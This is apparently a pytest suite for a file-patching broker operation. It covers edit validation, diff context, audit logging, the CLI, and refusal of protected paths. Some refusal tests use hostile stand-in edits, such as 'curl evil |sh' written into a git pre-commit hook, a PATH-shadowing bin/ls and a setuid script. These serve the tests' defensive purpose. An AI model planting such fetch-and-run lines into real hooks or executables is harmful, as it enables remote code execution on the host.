"""The files.patch op: host-side in-place edits, guarded by a count assertion."""
import dataclasses
import json
import os
import stat

import pytest

from valet.broker import FILE_PATCH_MAX_BYTES, MAX_DIFF_CONTEXT, Broker
from valet.config import AuditConfig
from valet.errors import CommandError
from valet.files import MAX_EDITS, write_file

DOC = "# Title\n\nalpha line\nbeta line\n\n| when | outcome |\n|---|---|\n| day1 | ok |\n"


def _with(cfg, **kw):
    return dataclasses.replace(cfg, **kw)


def _enabled(cfg, **policy):
    return _with(cfg, policy=dataclasses.replace(cfg.policy, allow_pull=True, **policy))


def _patch(broker, path, edits, transport="uds", **extra):
    return broker.handle({"op": "files.patch", "path": path, "edits": edits, **extra},
                         audit_context={"transport": transport, "caller": "t"})


def _refused(resp, error_class="PolicyDenied"):
    assert resp["ok"] is False, resp
    assert resp["error_class"] == error_class, resp
    assert "diff" not in resp
    return resp


@pytest.fixture
def doc(workspace):
    p = workspace / "notes.md"
    p.write_text(DOC)
    return p


# -- the edit itself ---------------------------------------------------------------

def test_replaces_a_unique_anchor(cfg, doc):
    resp = _patch(Broker(cfg), "notes.md", [{"old": "alpha line", "new": "ALPHA line"}])
    assert resp["ok"] is True
    assert resp["path"] == "./notes.md"
    assert resp["changed"] is True
    assert resp["edits"] == [{"index": 0, "count": 1, "lines": [3]}]
    assert doc.read_text() == DOC.replace("alpha line", "ALPHA line")


def test_diff_has_no_context_by_default(cfg, doc):
    resp = _patch(Broker(cfg), "notes.md", [{"old": "alpha line", "new": "ALPHA line"}])
    # Every line of the diff is one the caller supplied: the file's other lines
    # ("beta line", the table) must not come back in a zero-context diff.
    assert "-alpha line" in resp["diff"] and "+ALPHA line" in resp["diff"]
    assert "beta" not in resp["diff"]
    assert resp["context"] == 0


def test_missing_anchor_changes_nothing(cfg, doc):
    resp = _refused(_patch(Broker(cfg), "notes.md",
                           [{"old": "gamma line", "new": "x"}]), "ValidationError")
    assert "found 0" in resp["detail"]
    assert doc.read_text() == DOC


def test_ambiguous_anchor_changes_nothing(cfg, doc):
    resp = _refused(_patch(Broker(cfg), "notes.md", [{"old": "line", "new": "row"}]),
                    "ValidationError")
    assert "found 2" in resp["detail"]
    assert doc.read_text() == DOC


def test_explicit_count_replaces_every_occurrence(cfg, doc):
    resp = _patch(Broker(cfg), "notes.md", [{"old": "line", "new": "row", "count": 2}])
    assert resp["ok"] is True
    assert resp["edits"][0] == {"index": 0, "count": 2, "lines": [3, 4]}
    assert doc.read_text() == DOC.replace("line", "row")


def test_one_failing_edit_discards_the_whole_request(cfg, doc):
    _refused(_patch(Broker(cfg), "notes.md",
                    [{"old": "alpha line", "new": "ALPHA"},
                     {"old": "nowhere", "new": "x"}]), "ValidationError")
    assert doc.read_text() == DOC


def test_edits_apply_in_order_against_the_running_text(cfg, doc):
    # The second anchor only exists because the first edit created it.
    resp = _patch(Broker(cfg), "notes.md",
                  [{"old": "alpha line", "new": "gamma line"},
                   {"old": "gamma line\nbeta", "new": "gamma line\nBETA"}])
    assert resp["ok"] is True
    assert "gamma line\nBETA line" in doc.read_text()


def test_pair_form_is_accepted(cfg, doc):
    resp = _patch(Broker(cfg), "notes.md", [["alpha line", "ALPHA line"]])
    assert resp["ok"] is True
    assert "ALPHA line" in doc.read_text()


def test_append_adds_a_trailing_line(cfg, doc):
    resp = _patch(Broker(cfg), "notes.md", [["| day1 | ok |", "| day1 | ok |"]],
                  append="| day2 | ok |")
    assert resp["ok"] is True
    assert resp["appended_bytes"] == len(b"| day2 | ok |")
    assert doc.read_text() == DOC + "| day2 | ok |\n"


def test_append_to_a_file_without_a_trailing_newline(cfg, workspace):
    (workspace / "f.md").write_text("first row")
    resp = _patch(Broker(cfg), "f.md", [["first row", "first row"]], append="second row\n")
    assert resp["ok"] is True
    assert (workspace / "f.md").read_text() == "first row\nsecond row\n"


def test_a_no_op_edit_writes_nothing(cfg, doc):
    before = doc.stat().st_mtime_ns
    resp = _patch(Broker(cfg), "notes.md", [{"old": "alpha line", "new": "alpha line"}])
    assert resp["ok"] is True
    assert resp["changed"] is False
    assert resp["bytes_written"] == 0
    assert doc.stat().st_mtime_ns == before


def test_dry_run_reports_the_diff_without_writing(cfg, doc):
    resp = _patch(Broker(cfg), "notes.md", [{"old": "alpha line", "new": "ALPHA line"}],
                  dry_run=True)
    assert resp["ok"] is True
    assert resp["changed"] is True and resp["dry_run"] is True
    assert resp["bytes_written"] == 0
    assert "+ALPHA line" in resp["diff"]
    assert doc.read_text() == DOC


def test_reports_sizes_and_hashes_of_both_versions(cfg, doc):
    import hashlib
    resp = _patch(Broker(cfg), "notes.md", [{"old": "alpha", "new": "ALPHA"}])
    assert resp["sha256_before"] == hashlib.sha256(DOC.encode()).hexdigest()
    assert resp["sha256"] == hashlib.sha256(doc.read_bytes()).hexdigest()
    assert resp["bytes_before"] == len(DOC.encode())
    assert resp["bytes_after"] == len(doc.read_bytes())


def test_existing_permissions_are_kept(cfg, doc):
    os.chmod(doc, 0o600)
    assert _patch(Broker(cfg), "notes.md", [["alpha", "ALPHA"]])["ok"] is True
    assert stat.S_IMODE(doc.stat().st_mode) == 0o600


def test_unicode_survives_the_round_trip(cfg, workspace):
    (workspace / "u.md").write_text("héllo — wörld\n", encoding="utf-8")
    resp = _patch(Broker(cfg), "u.md", [["wörld", "wörld 🌍"]])
    assert resp["ok"] is True
    assert (workspace / "u.md").read_text(encoding="utf-8") == "héllo — wörld 🌍\n"


# -- malformed requests ------------------------------------------------------------

@pytest.mark.parametrize("edits", [
    None, [], "not a list", [{"new": "x"}], [{"old": "", "new": "x"}],
    [{"old": "a", "new": 1}], [{"old": "a", "new": "b", "count": 0}],
    [{"old": "a", "new": "b", "count": "one"}], [["only-one-side"]], ["nonsense"],
])
def test_malformed_edits_are_validation_errors(cfg, doc, edits):
    _refused(_patch(Broker(cfg), "notes.md", edits), "ValidationError")
    assert doc.read_text() == DOC


def test_too_many_edits_are_refused(cfg, doc):
    edits = [{"old": "alpha", "new": "x"}] * (MAX_EDITS + 1)
    _refused(_patch(Broker(cfg), "notes.md", edits), "ValidationError")


def test_append_must_be_a_string(cfg, doc):
    _refused(_patch(Broker(cfg), "notes.md", [["alpha", "a"]], append=[1]),
             "ValidationError")


def test_missing_file_is_a_validation_error(cfg, workspace):
    _refused(_patch(Broker(cfg), "nope.md", [["a", "b"]]), "ValidationError")


def test_directory_is_refused(cfg, workspace):
    (workspace / "sub").mkdir()
    _refused(_patch(Broker(cfg), "sub", [["a", "b"]]), "ValidationError")


def test_binary_file_is_refused(cfg, workspace):
    (workspace / "blob.bin").write_bytes(b"\x00\x01binary\x00")
    _refused(_patch(Broker(cfg), "blob.bin", [["binary", "text"]]), "ValidationError")


def test_oversize_result_is_refused(cfg, workspace, monkeypatch):
    (workspace / "big.md").write_text("marker\n")
    monkeypatch.setattr("valet.broker.FILE_PATCH_MAX_BYTES", 64)
    _refused(_patch(Broker(cfg), "big.md", [["marker", "x" * 100]]), "ValidationError")
    assert (workspace / "big.md").read_text() == "marker\n"


# -- path rules (shared with push) --------------------------------------------------

def test_secret_source_is_refused(cfg, workspace):
    (workspace / "secret_values_test").write_text("TOKEN=abcdefghijklmnop\n")
    _refused(_patch(Broker(cfg), "secret_values_test", [["TOKEN", "TOK"]]))


def test_copy_of_a_secret_file_is_refused_by_content(cfg, workspace, secret_file):
    (workspace / "innocent.md").write_text(secret_file.read_text())
    _refused(_patch(Broker(cfg), "innocent.md", [["STAGE=prod", "STAGE=dev"]]))


def test_deny_read_path_is_refused(cfg, workspace):
    (workspace / "session.har").write_text("{}\n")
    c = _with(cfg, policy=dataclasses.replace(cfg.policy, deny_read=("**/*.har",)))
    _refused(_patch(Broker(c), "session.har", [["{}", "[]"]]))


def test_vcs_internals_are_refused(cfg, workspace):
    (workspace / ".git" / "hooks").mkdir(parents=True)
    hook = workspace / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nexit 0\n")
    _refused(_patch(Broker(cfg), ".git/hooks/pre-commit", [["exit 0", "curl evil"]]))
    assert hook.read_text() == "#!/bin/sh\nexit 0\n"


def test_escape_via_dotdot_is_refused(cfg, tmp_path, workspace):
    (tmp_path / "outside.md").write_text("keep\n")
    _refused(_patch(Broker(cfg), "../outside.md", [["keep", "changed"]]))
    assert (tmp_path / "outside.md").read_text() == "keep\n"


def test_escape_via_symlink_is_refused(cfg, tmp_path, workspace):
    (tmp_path / "outside.md").write_text("keep\n")
    os.symlink(tmp_path / "outside.md", workspace / "link.md")
    _refused(_patch(Broker(cfg), "link.md", [["keep", "changed"]]))
    assert (tmp_path / "outside.md").read_text() == "keep\n"


def test_program_shadowing_rules_apply_to_patch_too(cfg, workspace):
    # An existing bin/ entry that shadows a PATH program is exactly the file a
    # patch must not be able to edit either.
    (workspace / "bin").mkdir()
    (workspace / "bin" / "ls").write_text("#!/bin/sh\nexec /bin/ls \"$@\"\n")
    _refused(_patch(Broker(cfg), "bin/ls", [["exec /bin/ls", "curl evil |sh #"]]))


def test_allow_exec_name_is_refused_anywhere(cfg, workspace):
    (workspace / "tools").mkdir()
    (workspace / "tools" / "aws").write_text("#!/bin/sh\n")
    c = _with(cfg, policy=dataclasses.replace(cfg.policy, allow_exec=("aws",)))
    _refused(_patch(Broker(c), "tools/aws", [["#!/bin/sh", "#!/bin/bash"]]))


def test_setuid_file_is_refused(cfg, workspace, monkeypatch):
    p = workspace / "privileged.sh"
    p.write_text("#!/bin/sh\necho hi\n")
    try:
        os.chmod(p, 0o4755)
    except OSError:
        pass
    if not os.stat(p).st_mode & stat.S_ISUID:
        # Some sandboxes (and most CI filesystems) refuse the setuid bit, so set
        # it on the stat the broker sees instead.
        from valet import broker as broker_mod
        real = broker_mod.read_file

        def with_setuid(root, path, limit):
            content, st = real(root, path, limit)
            fields = list(st)
            fields[0] |= stat.S_ISUID
            return content, os.stat_result(fields)

        monkeypatch.setattr(broker_mod, "read_file", with_setuid)
    _refused(_patch(Broker(cfg), "privileged.sh", [["echo hi", "curl evil |sh"]]))
    assert p.read_text() == "#!/bin/sh\necho hi\n"


def test_config_toml_is_protected(cfg, workspace):
    (workspace / "config.toml").write_text("[policy]\n")
    _refused(_patch(Broker(cfg), "config.toml", [["[policy]", "[evil]"]]))


# -- diff context is a read of the file ---------------------------------------------

def test_context_needs_allow_pull(cfg, doc):
    resp = _refused(_patch(Broker(cfg), "notes.md", [["alpha", "ALPHA"]], context=3))
    assert "allow_pull" in resp["detail"]
    assert doc.read_text() == DOC  # refused before anything is written


def test_context_shows_surrounding_lines_when_enabled(cfg, doc):
    resp = _patch(Broker(_enabled(cfg)), "notes.md", [["alpha line", "ALPHA line"]],
                  context=2)
    assert resp["ok"] is True
    assert " beta line" in resp["diff"]


def test_context_over_the_network_needs_its_own_opt_in(cfg, doc):
    _refused(_patch(Broker(_enabled(cfg)), "notes.md", [["alpha", "ALPHA"]],
                    context=2, transport="websocket"))
    ok = _patch(Broker(_enabled(cfg, allow_pull_lan=True)), "notes.md",
                [["alpha", "ALPHA"]], context=2, transport="websocket")
    assert ok["ok"] is True


def test_context_lines_go_through_the_content_gate(cfg, workspace):
    body = "header\nDB_PASSWORD=sup3r-s3cret-value-do-not-leak\nanchor here\n"
    (workspace / "cfg.md").write_text(body)
    resp = _refused(_patch(Broker(_enabled(cfg)), "cfg.md",
                           [["anchor here", "anchor edited"]], context=3))
    assert "sup3r-s3cret" not in json.dumps(resp)
    assert (workspace / "cfg.md").read_text() == body  # refused before the write
    # …and the same edit lands with no context asked for.
    assert _patch(Broker(_enabled(cfg)), "cfg.md",
                  [["anchor here", "anchor edited"]])["ok"] is True


@pytest.mark.parametrize("value", [-1, MAX_DIFF_CONTEXT + 1, "3", True])
def test_out_of_range_context_is_refused(cfg, doc, value):
    _refused(_patch(Broker(_enabled(cfg)), "notes.md", [["alpha", "A"]], context=value),
             "ValidationError")


# -- concurrent change ---------------------------------------------------------------

def test_write_is_refused_if_the_file_changed_since_it_was_read(cfg, workspace):
    p = workspace / "race.md"
    p.write_text("original\n")
    st = os.stat(p)
    p.write_text("edited on the host\n")  # someone else got there first
    with pytest.raises(CommandError):
        write_file(str(workspace), str(p), b"patched\n", 0o644, overwrite=True, expect=st)
    assert p.read_text() == "edited on the host\n"


# -- audit ----------------------------------------------------------------------------

def test_patch_is_audited_without_content(cfg, tmp_path, workspace, doc):
    log = tmp_path / "audit.jsonl"
    broker = Broker(_with(cfg, audit=AuditConfig(log_path=str(log))))
    ok = _patch(broker, "notes.md", [["alpha line", "ALPHA-MARKER line"]])
    _patch(broker, "secret_values_test", [["a", "b"]])
    text = log.read_text()
    events = [json.loads(line) for line in text.splitlines()]
    assert "ALPHA-MARKER" not in text and "alpha line" not in text
    assert events[0]["op"] == "files.patch"
    assert events[0]["decision"] == "allowed"
    assert events[0]["path"] == "./notes.md"
    assert events[0]["bytes_written"] == ok["bytes_after"]
    assert events[0]["sha256"] == ok["sha256"]
    assert events[1]["decision"] != "allowed"
    assert events[1]["path"] == "secret_values_test"


# -- client -----------------------------------------------------------------------------

class _Conn:
    def __init__(self, response):
        self.response = response
        self.requests = []

    def request(self, req):
        self.requests.append(req)
        return self.response

    def close(self):
        pass


def _ok_response(**over):
    return {"op": "files.patch", "ok": True, "path": "./notes.md", "changed": True,
            "edits": [{"index": 0, "count": 1, "lines": [3]}], "appended_bytes": 0,
            "dry_run": False, "context": 0, "bytes_before": 10, "bytes_after": 11,
            "bytes_written": 11, "diff": "--- a\n+++ b\n@@ -3 +3 @@\n-old\n+new\n",
            **over}


def _cli(monkeypatch, response, argv):
    from valet.cli import main
    conn = _Conn(response)
    monkeypatch.setattr("valet.cli._connect", lambda _a: (conn, object(), None))
    return main(argv), conn


def test_cli_sends_old_and_new_and_prints_the_diff(monkeypatch, capsys):
    code, conn = _cli(monkeypatch, _ok_response(),
                      ["files", "patch", "notes.md", "--old", "old", "--new", "new"])
    assert code == 0
    req = conn.requests[0]
    assert req["op"] == "files.patch"
    assert req["edits"] == [{"old": "old", "new": "new", "count": 1}]
    assert "context" not in req and "dry_run" not in req
    out = capsys.readouterr().out
    assert "-old" in out and "patched ./notes.md (1 edit" in out


def test_cli_reads_the_sides_from_files(monkeypatch, tmp_path):
    # Taken byte for byte, trailing newline included: an anchor file written by
    # an editor ends in one, and so must the replacement.
    (tmp_path / "old.txt").write_text("was here\n")
    (tmp_path / "new.txt").write_text("is here\n")
    code, conn = _cli(monkeypatch, _ok_response(), [
        "files", "patch", "notes.md", "--count", "2",
        "--old-file", str(tmp_path / "old.txt"), "--new-file", str(tmp_path / "new.txt")])
    assert code == 0
    assert conn.requests[0]["edits"] == [
        {"old": "was here\n", "new": "is here\n", "count": 2}]


def test_cli_reads_an_edits_file(monkeypatch, tmp_path):
    spec = tmp_path / "edits.json"
    spec.write_text(json.dumps({"replacements": [["a", "b"], ["c", "d"]],
                                "append": "| row |\n"}))
    code, conn = _cli(monkeypatch, _ok_response(),
                      ["files", "patch", "notes.md", "--edits", str(spec)])
    assert code == 0
    assert conn.requests[0]["edits"] == [["a", "b"], ["c", "d"]]
    assert conn.requests[0]["append"] == "| row |\n"


def test_cli_passes_context_and_dry_run(monkeypatch):
    code, conn = _cli(monkeypatch, _ok_response(dry_run=True), [
        "files", "patch", "notes.md", "--old", "a", "--new", "b",
        "--context", "3", "--dry-run"])
    assert code == 0
    assert conn.requests[0]["context"] == 3
    assert conn.requests[0]["dry_run"] is True


@pytest.mark.parametrize("argv", [
    ["files", "patch", "notes.md", "--old", "a"],
    ["files", "patch", "notes.md", "--new", "b"],
    ["files", "patch", "notes.md", "--old", "a", "--old-file", "/x", "--new", "b"],
])
def test_cli_refuses_a_half_specified_edit(monkeypatch, capsys, argv):
    code, conn = _cli(monkeypatch, _ok_response(), argv)
    assert code == 2
    assert conn.requests == []  # nothing is sent


def test_cli_reports_a_host_refusal(monkeypatch, capsys):
    code, _ = _cli(monkeypatch,
                   {"op": "files.patch", "ok": False, "error_class": "ValidationError",
                    "detail": "edit 0: expected 1 occurrence(s) of the anchor, found 3"},
                   ["files", "patch", "notes.md", "--old", "a", "--new", "b"])
    assert code == 1
    assert "found 3" in capsys.readouterr().err


def test_cli_says_when_nothing_changed(monkeypatch, capsys):
    code, _ = _cli(monkeypatch, _ok_response(changed=False, diff=""),
                   ["files", "patch", "notes.md", "--old", "a", "--new", "a"])
    assert code == 0
    assert "already matches" in capsys.readouterr().out
